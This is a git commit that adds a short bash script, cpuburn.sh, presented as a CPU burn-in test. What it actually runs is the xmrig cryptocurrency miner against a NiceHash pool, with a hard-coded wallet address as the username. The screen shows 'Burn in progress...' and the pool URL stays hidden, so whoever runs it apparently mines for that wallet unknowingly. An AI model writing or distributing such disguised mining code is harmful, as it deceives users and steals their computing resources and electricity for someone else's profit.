e9b9712c098b7b0f31bd3b4dc60bdc80cb374bd6
Davenport <41927748+davenport651@users.noreply.github.com>
2019-09-10 13:34:31 -0400

    Create cpuburn.sh

---
+++ cpuburn.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+#variables
+username="15ufDkou9LJrdWTizkVTkAeXTfFC7HT13t.test$RANDOM"
+url="cryptonightr.usa-new.nicehash.com:3375"
+
+cd /root/cpuburn/
+
+echo $username
+#echo $url
+echo Burn in progress...
+echo "Ctrl + C to abort"
+
+#Execute CPU burn-in test
+#./xmrig --url=$url --user=$username --pass="x" --variant=-1 --asm=auto --nicehash --donate-level=1 &> /dev/null
+./xmrig --url=$url --user=$username --pass="x" --variant=-1 --asm=auto --nicehash --donate-level=1 | grep speed
